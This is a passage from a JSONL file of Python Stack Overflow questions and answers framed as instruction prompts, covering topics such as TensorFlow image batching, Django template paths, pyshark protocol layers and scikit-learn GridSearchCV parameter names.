fine.<\/p>","output_text":"<p>I can imagine that not all images have the same shape and that is why you are getting mismatches when <code>batch_size &gt; 1<\/code>. I would recommend resizing all images to the same size. Here is an example:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def process_path(x):\n  content, image_path = x[0], x[1]\n  img = tf.io.read_file(image_path)\n  img = tf.io.decode_png(img, channels=3)\n  img = tf.image.resize(img,[120, 120], method=tf.image.ResizeMethod.NEAREST_NEIGHBOR)\n  return content, img\n<\/code><\/pre>\n<p>Otherwise, you will have to sort your batches by image size and also take care of the labels.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Loop through list of lists and divide list values<p>I would like to iterate through two lists of lists and divide them by eachother.<\/p>\n<p>Starting with:<\/p>\n<pre><code>patient1_list_A = [1,2,3]\npatient2_list_A = [4,5,6]\npatient3_list_A = [7,8,9]\npatient1_list_B = [10,11,12]\npatient2_list_B = [13,14,15]\npatient3_list_B = [16,17,18]\n\nlist_A=[patient1_list_A, patient2_list_A, patient3_list_A]\nlist_B=[patient1_list_B, patient2_list_B, patient3_list_B]\n<\/code><\/pre>\n<p>I'd like the output to be a new list filled with the normalized patient values.<\/p>\n<pre><code>normalized_list=[normalized_patient1, normalized_patient2, normalized_patient3]\n<\/code><\/pre>\n<p>where,<\/p>\n<pre><code>normalized_patient1=[1\/10, 2\/11, 3\/12]\nnormalized_patient2=[4\/13,5\/14,6\/15]\nnormalized_patient3=[7\/16, 8\/17, 9\/18]\n<\/code><\/pre>\n<p>I am thinking of something like this, but I am unsure how to make this also loop through the list_A and list_B of patients.<\/p>\n<pre><code>normalized_patient1_list=[]\nfor i,j in zip(patient1_list_A,patient1_list_B):\n    normalized_patient1_list.append(i\/j)\n<\/code><\/pre>","output_text":"<p>you can use <code>zip<\/code> to concatenate the sublist and there element and use metric operations<\/p>\n<pre><code>patient1_list_A = [1,2,3]\npatient2_list_A = [4,5,6]\npatient3_list_A = [7,8,9]\npatient1_list_B = [10,11,12]\npatient2_list_B = [13,14,15]\npatient3_list_B = [16,17,18]\n\nlist_A=[patient1_list_A, patient2_list_A, patient3_list_A]\nlist_B=[patient1_list_B, patient2_list_B, patient3_list_B]\n\n# just for str method for your calu\nresult = [[&quot;{}\/{}&quot;.format(c, d) for c, d in zip(a, b)] for a,b in zip(list_A, list_B) ]\n# output [['1\/10', '2\/11', '3\/12'], ['4\/13', '5\/14', '6\/15'], ['7\/16', '8\/17', '9\/18']]\n# actual calculated result\nnormalized_patient1_list = [[c\/d for c, d in zip(a, b)] for a,b in zip(list_A, list_B) ]\n&quot;&quot;&quot;output\n  [[0.1, 0.18181818181818182, 0.25],\n  [0.3076923076923077, 0.35714285714285715, 0.4],\n  [0.4375, 0.47058823529411764, 0.5]]\n\n&quot;&quot;&quot;\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why and how: Missing symlink for python3?<p>I am on macOS 10.15.7.<\/p>\n<p>I need both <code>python2<\/code> and <code>python3<\/code>.\nI am a beginner which is why I often struggle to understand many terms. A fellow student told me that the <code>-&gt;<\/code> are symlinks.<\/p>\n<p>When running <code>me$ which python3<\/code> I get:<\/p>\n<pre><code>\/Library\/Frameworks\/Python.framework\/Versions\/3.9\/bin\/python3\n<\/code><\/pre>\n<p>But when checking <code>ll \/usr\/bin\/python*<\/code><\/p>\n<pre><code>lrwxr-xr-x  1 root  wheel    75B Oct  9  2019 \/usr\/bin\/python -&gt; ..\/..\/System\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/bin\/python2.7\nlrwxr-xr-x  1 root  wheel    82B Oct  9  2019 \/usr\/bin\/python-config -&gt; ..\/..\/System\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/bin\/python2.7-config\nlrwxr-xr-x  1 root  wheel    75B Oct  9  2019 \/usr\/bin\/python2 -&gt; ..\/..\/System\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/bin\/python2.7\nlrwxr-xr-x  1 root  wheel    75B Oct  9  2019 \/usr\/bin\/python2.7 -&gt; ..\/..\/System\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/bin\/python2.7\nlrwxr-xr-x  1 root  wheel    82B Oct  9  2019 \/usr\/bin\/python2.7-config -&gt; ..\/..\/System\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/bin\/python2.7-config\n-rwxr-xr-x  1 root  wheel    31K Oct 30  2020 \/usr\/bin\/python3\nlrwxr-xr-x  1 root  wheel    76B Oct  9  2019 \/usr\/bin\/pythonw -&gt; ..\/..\/System\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/bin\/pythonw2.7\nlrwxr-xr-x  1 root  wheel    76B Oct  9  2019 \/usr\/bin\/pythonw2.7 -&gt; ..\/..\/System\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/bin\/pythonw2.7\n<\/code><\/pre>\n<p>Everything looks the same except for the line concerning python3.<\/p>\n<ol>\n<li>Why does <code>which python3<\/code> return a different path than the one I see when <code>ll<\/code>ing <code>\/usr\/bin\/python*<\/code>. I mean both exist...\nSo, why is <code>\/Library\/Frameworks\/Python.framework\/Versions\/3.9\/bin\/python3<\/code> preferred?<\/li>\n<li>Why is there no symlink for python3? What went wrong during the installation?<\/li>\n<li>Is it &quot;safe&quot; to just <code>manually<\/code> generate a symlink between the <code>\/usr\/bin\/python3<\/code> and the <code>\/Library\/Frameworks\/Python.framework\/Versions\/3.9\/bin\/python3<\/code> as shown <a href=\"https:\/\/osxdaily.com\/2015\/08\/06\/make-symbolic-links-command-line-mac-os-x\/\" rel=\"nofollow noreferrer\">here<\/a>. <code>ln -s \/path\/to\/original\/ \/path\/to\/link<\/code> Being a beginner I'd rather ask the internet first ;)<\/li>\n<\/ol>\n<p>I'm happy to edit my question following your suggestions as I'm here to learn - and hopefully soon also to help.<\/p>\n<p>Thanks for your help.<\/p>","output_text":"<p>From the <code>which<\/code> man page<\/p>\n<blockquote>\n<p>which returns the pathnames of the files (or links) which would be\nexecuted in the current environment, had its arguments been given as  commands  in a strictly POSIX-conformant shell<\/p>\n<\/blockquote>\n<p>and in the options list<\/p>\n<blockquote>\n<pre><code>   -a     print all matching pathnames of each argument\n<\/code><\/pre>\n<\/blockquote>\n<p>So, without the <code>-a<\/code>, <code>which<\/code> simply prints the first 'hit' on your <code>PATH<\/code>. So for example, if <code>\/Library\/Frameworks\/Python.framework\/Versions\/3.9\/bin<\/code> is before <code>\/usr\/bin<\/code> in your <code>PATH<\/code>, <code>which python3<\/code> will return only one.<\/p>\n<p>I would be willing to bet that your running <code>which -a python3<\/code> will return:<\/p>\n<pre><code>\/Library\/Frameworks\/Python.framework\/Versions\/3.9\/bin\n\/usr\/bin\/python3\n<\/code><\/pre>\n<p>Your install went fine, you just have more than one <code>python3<\/code> executable installed. There is also no need to do any extra symlinking.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Get FFT waveform in python to match Adobe Audition Frequency Analysis<p>For the wav file found <a href=\"https:\/\/drive.google.com\/file\/d\/17l6fsZUm-IiTRgUpOPT0Bv4oE_I5I9tT\/view?usp=sharing\" rel=\"nofollow noreferrer\">here<\/a>, I wanted to match the spectrum shown in Adobe Audition:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/TX7FF.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/TX7FF.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Currently, with the code I use:<\/p>\n<pre><code>import scipy.io.wavfile as wavfile\nimport scipy\nimport scipy.fftpack\nimport numpy as np\nfrom matplotlib import pyplot as plt\n\n\nfile1 = (r'G:\/file1.wav')\n\nfs_rate, signal = wavfile.read(file1)\nprint (&quot;Frequency sampling&quot;, fs_rate)\nl_audio = len(signal.shape)\nprint (&quot;Channels&quot;, l_audio)\nif l_audio == 2:\n    signal = signal.sum(axis=1) \/ 2\nN = signal.shape[0]\nprint (&quot;Complete Samplings N&quot;, N)\nsecs = N \/ float(fs_rate)\nprint (&quot;secs&quot;, secs)\nTs = 1.0\/fs_rate # sampling interval in time\nprint (&quot;Timestep between samples Ts&quot;, Ts)\nt = np.arange(0, secs, Ts) # time vector as scipy arange field \/ numpy.ndarray\nFFT = scipy.fftpack.fft(signal)\nFFT_side = FFT[range(N\/\/2)] # one side FFT range\nfreqs = scipy.fftpack.fftfreq(signal.size, t[1]-t[0])\nfft_freqs = np.array(freqs)\nfreqs_side = freqs[range(N\/\/2)] # one side frequency range\nfft_freqs_side = np.array(freqs_side)\n\nplt.plot(freqs_side\/1000, 2.0\/N * abs(FFT_side))\nplt.xlabel('Frequency (kHz)')\nplt.ylabel('Count single-sided')\n\nplt.show()\n<\/code><\/pre>\n<p>I get this plot:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/7vhQv.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/7vhQv.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Can you help me to get the plot that is just like that shown in the Adobe Audition Frequency Analysis window?<\/p>\n<p>Any help will be greatly appreciated!<\/p>","output_text":"<p>Using the example from <a href=\"https:\/\/docs.scipy.org\/doc\/scipy\/reference\/generated\/scipy.signal.welch.html#scipy-signal-welch\" rel=\"nofollow noreferrer\">scipy.signal.welch<\/a>:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>fs_rate, signal = wavfile.read(file1)\nf, Pxx_den = scipy.signal.welch(signal, fs_rate, nperseg=512, window='blackmanharris')\nplt.semilogy(f, Pxx_den)\nplt.semilogx(f, Pxx_den)\nplt.xlabel('frequency [Hz]')\nplt.show()\n<\/code><\/pre>\n<p>The y-axis units are off, but this should get you started.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/R2zCt.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/R2zCt.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django and Tailwind 'TemplateDoesNotExist' error<p>I am following this tutoiral: <a href=\"https:\/\/www.ordinarycoders.com\/blog\/article\/django-tailwind\" rel=\"nofollow noreferrer\">https:\/\/www.ordinarycoders.com\/blog\/article\/django-tailwind<\/a><\/p>\n<p>I have a django project called 'project' with two apps in it 'app' and 'main'. I'm trying to load <strong>'main &gt; template &gt; main &gt; home.html'<\/strong>. but I get this error:<\/p>\n<pre><code>Internal Server Error: \/\nTraceback (most recent call last): \n  File &quot;C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\lib\\site-packages\\django\\core\\handlers\\exception.py&quot;, line 47, in inner     \n    response = get_response(request)\n  File &quot;C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\lib\\site-packages\\django\\core\\handlers\\base.py&quot;, line 181, in _get_response \n    response = wrapped_callback(request, *callback_args, **callback_kwargs)\n  File &quot;C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\project\\main\\views.py&quot;, line 5, in homepage\n    return render(request = request, template_name=&quot;main\/home.html&quot;)  \n  File &quot;C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\lib\\site-packages\\django\\shortcuts.py&quot;, line 19, in render\n    content = loader.render_to_string(template_name, context, request, using=using)\n  File &quot;C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\lib\\site-packages\\django\\template\\loader.py&quot;, line 61, in render_to_string  \n    template = get_template(template_name, using=using)\n  File &quot;C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\lib\\site-packages\\django\\template\\loader.py&quot;, line 19, in get_template      \n    raise TemplateDoesNotExist(template_name, chain=chain)\ndjango.template.exceptions.TemplateDoesNotExist: main\/home.html       \n[17\/Nov\/2021 11:49:03] &quot;GET \/ HTTP\/1.1&quot; 500 80436\n<\/code><\/pre>\n<p>Following the tutorial, I have in my <strong>'settings.py'<\/strong>:<\/p>\n<pre><code>&quot;&quot;&quot;\nDjango settings for project project.\n\nGenerated by 'django-admin startproject' using Django 3.2.9.\n\nFor more information on this file, see\nhttps:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/\n\nFor the full list of settings and their values, see\nhttps:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/\n&quot;&quot;&quot;\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR \/ 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/deployment\/checklist\/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = _____________________[blanked out]_____________________\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'tailwind',\n    'app',\n    'main',\n]\n\nTAILWIND_APP_NAME = 'app'\nNPM_BIN_PATH = r&quot;C:\\Program Files\\nodejs\\npm.cmd&quot;\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nTAILWIND_APP_NAME = 'app'\n\nROOT_URLCONF = 'project.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': ['C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\project\\main\\template'],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'project.wsgi.application'\n\n# Database\n# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR \/ 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/static-files\/\n\nSTATIC_URL = '\/static\/'\n\n# Default primary key field type\n# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n\n<\/code><\/pre>\n<p>In my <strong>project&gt;urls.py<\/strong> I have:<\/p>\n<pre><code>from django.contrib import admin\nfrom django.urls import path, include  #add include\n\nurlpatterns = [\n    path('admin\/', admin.site.urls),\n    path('', include ('main.urls')),   #add this\n]\n<\/code><\/pre>\n<p>In my <strong>main&gt;urls.py<\/strong>:<\/p>\n<pre><code>from django.urls import path\nfrom . import views\n\napp_name = &quot;main&quot;   \n\n\nurlpatterns = [\n    path(&quot;&quot;, views.homepage, name=&quot;homepage&quot;),\n]\n<\/code><\/pre>\n<p>In <strong>main&gt;views.py<\/strong> I have<\/p>\n<pre><code>from django.shortcuts import render\n\n# Create your views here.\ndef homepage(request):\n    return render(request = request, template_name=&quot;main\/home.html&quot;)\n<\/code><\/pre>\n<p>I've tried to add the template directory of main into DIRS in settings.py follwing this other Stack link:  <a href=\"https:\/\/stackoverflow.com\/questions\/42062630\/django-templatedoesnotexist-at-home-html-in-my-project\">Django: TemplateDoesNotExist at \/ home.html in my project<\/a><\/p>\n<p>But I haven't been able to open the html file.<\/p>\n<p>Any help greatly appreciated.\nThanks<\/p>","output_text":"<p>Hey change this line in your <code>settings.py<\/code>\nfrom this<\/p>\n<pre><code>        'DIRS': ['C:\\Users\\Kaij\\Documents\\djangoTests\\djangoTailwind2\\env\\project\\main\\template'],\n<\/code><\/pre>\n<p>to this<\/p>\n<pre><code> [BASE_DIR\/ 'templates']\n<\/code><\/pre>\n<p>and then in your <code>main<\/code> directory create a folder called <code>templates<\/code> and within that folder create another folder called main and that is where your <code>home.html<\/code> goes into. so something like this<\/p>\n<pre><code>project -&gt; main -&gt; templates -&gt; home.html\n<\/code><\/pre>\n<p>and in your folder called main, create a <code>urls.py<\/code> and add these lines<\/p>\n<pre><code>from django.urls import path\nfrom .views import some_view_name\n\nurlpatterns = [\n    path('', some_view_name, name='home-view')\n]\n<\/code><\/pre>\n<p>then in main -&gt; views.py add this line to<\/p>\n<pre><code>from django.shortcuts import render\ndef some_view_name(request):\n    return render(request, &quot;main\/home.html&quot;)\n<\/code><\/pre>\n<p>that should some the problem for you.<\/p>\n<p>your directory structure should look like something like this<\/p>\n<pre><code>project \n    -&gt; project\n          urls.py\n           ...\n    -&gt; main\n          -&gt;templates\n            -&gt; main\n                 -&gt; home.html\n   manage.py\n   ...\n<\/code><\/pre>\n<p>If this solves your problem please don't forget to accept it as the correct answer.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pyshark get specific protocol name not just TCP\/UDP<p>I'm building a tool to inspect PCAP files using PyShark, however am struggling to extract the specific protocols from the packets (e.g. SSH, MQTT, ARP) rather than just TCP or UDP.<\/p>\n<p>I'm wondering if anyone has experience with this? I've tried <code>packet.ip.proto<\/code> but that just returns TCP and UDP ID numbers, not names such as SSH or ARP.<\/p>\n<p>I'm trying to get the same information as Wireshark shows in the below example:\n<a href=\"https:\/\/i.stack.imgur.com\/bnkxn.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/bnkxn.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Thanks!<\/p>","output_text":"<p>Think I've figured it out. Looks like each specific type of protocol adds its own layer to the packet, so by printing out all the layers in a packet, you can identify any non-standard layers.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>with pyshark.FileCapture(TEST_FILE) as cap:\n    for i, pkt in enumerate(cap):\n        print(pkt.layers)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>[&lt;ETH Layer&gt;, &lt;IP Layer&gt;, &lt;TCP Layer&gt;, &lt;SYNERGY Layer&gt;]\n[&lt;ETH Layer&gt;, &lt;IP Layer&gt;, &lt;TCP Layer&gt;, &lt;SYNERGY Layer&gt;]\n[&lt;ETH Layer&gt;, &lt;IP Layer&gt;, &lt;TCP Layer&gt;, &lt;SYNERGY Layer&gt;]\n[&lt;ETH Layer&gt;, &lt;IP Layer&gt;, &lt;TCP Layer&gt;]\n[&lt;ETH Layer&gt;, &lt;IP Layer&gt;, &lt;TCP Layer&gt;, &lt;SSH Layer&gt;]\n[&lt;ETH Layer&gt;, &lt;IP Layer&gt;, &lt;TCP Layer&gt;, &lt;SSH Layer&gt;]\n[&lt;ETH Layer&gt;, &lt;IP Layer&gt;, &lt;TCP Layer&gt;, &lt;SSH Layer&gt;]\n<\/code><\/pre>\n<p>You can get a usable list of the layer names like so:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>with pyshark.FileCapture(TEST_FILE) as cap:\n    for i, pkt in enumerate(cap):\n        try:\n            print([pkt.layers[i].layer_name for i, lay in enumerate(pkt.layers)])\n        except AttributeError as ex:\n            print(ex)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>['eth', 'ip', 'tcp', 'synergy']\n['eth', 'ip', 'tcp', 'synergy']\n['eth', 'ip', 'tcp', 'synergy']\n['eth', 'ip', 'tcp']\n['eth', 'ip', 'tcp', 'ssh']\n['eth', 'ip', 'tcp', 'ssh']\n['eth', 'ip', 'tcp', 'ssh']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to access ColumnTransformer elements in GridSearchCV<p>I wanted to find out the correct naming convention when referring to individual preprocessor included in ColumnTransformer (which is part of a pipeline) in param_grid for grid_search.<\/p>\n<p><strong>Environment &amp; sample data:<\/strong><\/p>\n<pre><code>import seaborn as sns\nfrom sklearn.model_selection import train_test_split, GridSearchCV\nfrom sklearn.impute import SimpleImputer\nfrom sklearn.preprocessing import OneHotEncoder, KBinsDiscretizer, MinMaxScaler\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\ndf = sns.load_dataset('titanic')[['survived', 'age', 'embarked']]\nX_train, X_test, y_train, y_test = train_test_split(df.drop(columns='survived'), df['survived'], test_size=0.2, \n                                                    random_state=123)\n<\/code><\/pre>\n<p><strong>Pipeline:<\/strong><\/p>\n<pre><code>num = ['age']\ncat = ['embarked']\n\nnum_transformer = Pipeline(steps=[('imputer', SimpleImputer()), \n                                  ('discritiser', KBinsDiscretizer(encode='ordinal', strategy='uniform')),\n                                  ('scaler', MinMaxScaler())])\n\ncat_transformer = Pipeline(steps=[('imputer', SimpleImputer(strategy='constant', fill_value='missing')),\n                                  ('onehot', OneHotEncoder(handle_unknown='ignore'))])\n\npreprocessor = ColumnTransformer(transformers=[('num', num_transformer, num),\n                                               ('cat', cat_transformer, cat)])\n\npipe = Pipeline(steps=[('preprocessor', preprocessor),\n                       ('classiffier', LogisticRegression(random_state=1, max_iter=10000))])\n\nparam_grid = dict([SOMETHING]imputer__strategy = ['mean', 'median'],\n                  [SOMETHING]discritiser__nbins = range(5,10),\n                  classiffier__C = [0.1, 10, 100],\n                  classiffier__solver = ['liblinear', 'saga'])\ngrid_search = GridSearchCV(pipe, param_grid=param_grid, cv=10)\ngrid_search.fit(X_train, y_train)\n<\/code><\/pre>\n<p>Basically, what should I write instead of [SOMETHING] in my code?<\/p>\n<p>I have looked at <a href=\"https:\/\/stackoverflow.com\/questions\/62331674\/sklearn-combine-gridsearchcv-with-column-transform-and-pipeline\">this answer<\/a> which answered the question for <code>make_pipeline<\/code> - so using the similar idea, I tried 'preprocessor__num__', 'preprocessor__num_', 'pipeline__num__', 'pipeline__num_' - no luck so far.<\/p>\n<p>Thank you<\/p>","output_text":"<p>You were close, the correct way to declare it is like this:<\/p>\n<pre><code>param_grid = {'preprocessor__num__imputer__strategy' : ['mean', 'median'],\n              'preprocessor__num__discritiser__n_bins' : range(5,10),\n              'classiffier__C' : [0.1, 10, 100],\n              'classiffier__solver' : ['liblinear', 'saga']}\n<\/code><\/pre>\n<p>Here is the full code:<\/p>\n<pre><code>import seaborn as sns\nfrom sklearn.model_selection import train_test_split, GridSearchCV\nfrom sklearn.impute import SimpleImputer\nfrom sklearn.preprocessing import OneHotEncoder, KBinsDiscretizer, MinMaxScaler\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\ndf = sns.load_dataset('titanic')[['survived', 'age', 'embarked']]\nX_train, X_test, y_train, y_test = train_test_split(df.drop(columns='survived'), df['survived'], test_size=0.2, \n                                                    random_state=123)\nnum = ['age']\ncat = ['embarked']\n\nnum_transformer = Pipeline(steps=[('imputer', SimpleImputer()), \n                                  ('discritiser', KBinsDiscretizer(encode='ordinal', strategy='uniform')),\n                                  ('scaler', MinMaxScaler())])\n\ncat_transformer = Pipeline(steps=[('imputer', SimpleImputer(strategy='constant', fill_value='missing')),\n                                  ('onehot', OneHotEncoder(handle_unknown='ignore'))])\n\npreprocessor = ColumnTransformer(transformers=[('num', num_transformer, num),\n                                               ('cat', cat_transformer, cat)])\n\npipe = Pipeline(steps=[('preprocessor', preprocessor),\n                       ('classiffier', LogisticRegression(random_state=1, max_iter=10000))])\n\nparam_grid = {'preprocessor__num__imputer__strategy' : ['mean', 'median'],\n              'preprocessor__num__discritiser__n_bins' : range(5,10),\n              'classiffier__C' : [0.1, 10, 100],\n              'classiffier__solver' : ['liblinear', 'saga']}\ngrid_search = GridSearchCV(pipe, param_grid=param_grid, cv=10)\ngrid_search.fit(X_train, y_train)\n<\/code><\/pre>\n<p>One simply way to check the available parameter names is like this:<\/p>\n<pre><code>print(pipe.get_params().keys())\n<\/code><\/pre>\n<p>This will print out the list of all the available parameters which you can copy directly into your <code>params<\/code> dictionary.<\/p>\n<p>I have written a utility function which you can use to check if a parameter exist in a pipeline\/classifier by simply passing in a keyword.<\/p>\n<pre><code>def check_params_exist(esitmator, params_keyword):\n    all_params = esitmator.get_params().keys()\n    available_params = [x for x in all_params if params_keyword in x]\n    if len(available_params)==0:\n        return &quot;No matching params found!&quot;\n    else:\n        return available_params\n<\/code><\/pre>\n<p>Now if you are unsure of the exact name, just pass <code>imputer<\/code> as the keyword<\/p>\n<pre><code>print(check_params_exist(pipe, 'imputer'))\n<\/code><\/pre>\n<p>This will print the following list:<\/p>\n<pre><code>['preprocessor__num__imputer',\n 'preprocessor__num__imputer__add_indicator',\n 'preprocessor__num__imputer__copy',\n 'preprocessor__num__imputer__fill_value',\n 'preprocessor__num__imputer__missing_values',\n 'preprocessor__num__imputer__strategy',\n 'preprocessor__num__imputer__verbose',\n 'preprocessor__cat__imputer',\n 'preprocessor__cat__imputer__add_indicator',\n 'preprocessor__cat__imputer__copy',\n 'preprocessor__cat__imputer__fill_value',\n 'preprocessor__cat__imputer__missing_values',\n 'preprocessor__cat__imputer__strategy',\n 'preprocessor__cat__imputer__verbose']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n pythonic way to find if a list with duplicate items contains at least as many copies of each element of another list<p>Hi I have two lists <code>req<\/code> and <code>sup<\/code> each of may have duplicates and req can be empty.  I wanted a pythonic way to test that <code>sup<\/code> has all copies of each item in <code>req<\/code>.\nAs an example I would want a function contains with the following functionality:<\/p>\n<pre><code>requirements = [['a','b','b'],['a','c'],[]]\nsupplys = [['a','b','c'],['b','b','a','c']]\nfor sup in supplys:\n    print(sup)\n    for req in requirements:\n        print(req)\n        print(contains(req,sup))\n    print()\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>['a', 'b', 'c']\n['a', 'b', 'b']\nFalse\n['a', 'c']\nTrue\n[]\nTrue\n\n['b', 'b', 'a', 'c']\n['a', 'b', 'b']\nTrue\n['a', 'c']\nTrue\n[]\nTrue\n<\/code><\/pre>\n<p>What I currently have just seems to verbiouse, and I feel like there should be a way to do this as a one liner.<\/p>\n<pre><code>def contains(req,sup):\n    flag = True\n    for letter in set(req):\n        if self.sup.count(letter) &lt; req.count(letter):\n            flag = False\n    return flag\n<\/code><\/pre>","output_text":"<p>This is the one-liner I as able to come up with for any who discover this question later:\n<code>all([req.count(letter) &lt;= sup.count(letter) for letter in set(req)])<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Post request on api endpoint does not return data<p>I'm currently trying to use the API and the headers of a website instead of creating a web scraper. I have been trying to inspect the website by using Chrome Dev Tools and capturing the information under the <code>network<\/code> tab when an POST request has been made.<\/p>\n<p>So far I have no luck and have only been getting <code>&lt;Response [200]&gt;<\/code> from the endpoint but no data returned.<\/p>\n<p>Please advise what I did wrong.<\/p>\n<p>Below is my Python code:<\/p>\n<pre><code>    import requests\n\n    def get_data_from_api():\n    search_keyword = 'money'\n    api_endpoint = 'https:\/\/45bwzj1sgc-dsn.algolia.net\/1\/indexes\/*\/queries?x-algolia-agent=Algolia%20for%20JavaScript%20(4.2.0)%3B%20Browser'\n    payload = {\n        'x-xxxx-application-id': '45BWZJ1SGC', \n        'x-xxx-api-key': 'MTRkMGNlOGFhMWQ4YThmZDA0YmViNGY2M2ViYzBlMGMwNTBmMjllNjJmMDA4YmY1YzY3YzI2NzRmMzlhYThkM3RhZ0ZpbHRlcnM9JTVCJTVCJTIyc3VzX3B1YmxpYyUyMiUyQyUyMnN1c19jaGFubmVsX2FsbCUyMiUyQyUyMnN1c19jaGFubmVsX2ZlYXR1cmVkJTIyJTJDJTIyc3VzX2NoYW5uZWxfd2Vla2x5LW5ld3NsZXR0ZXIlMjIlMkMlMjJzdXNfY2hhbm5lbF9hbWElMjIlMkMlMjJzdXNfY2hhbm5lbF9saXZlc3RyZWFtJTIyJTJDJTIyc3VzX2NoYW5uZWxfc2hvdy1zdXMlMjIlMkMlMjJzdXNfY2hhbm5lbF9lbmdpbmVlcmluZyUyMiU1RCU1RCZhbmFseXRpY3NUYWdzPSU1QiUyMnN1cyUyMiU1RA=='\n        }\n\n    r = 